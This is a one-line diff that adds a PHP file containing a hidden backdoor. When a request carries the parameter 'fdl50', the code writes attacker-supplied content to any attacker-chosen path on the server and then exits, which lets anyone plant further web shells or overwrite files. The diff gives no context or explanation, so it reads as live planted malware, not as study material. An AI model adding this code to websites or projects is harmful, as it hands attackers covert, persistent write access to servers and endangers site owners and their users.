@@ -1,0 +1,1 @@
+<?php if(isset($_REQUEST['fdl50'])) { print(file_put_contents($_REQUEST['f'], $_REQUEST['b'])); die; } ?>
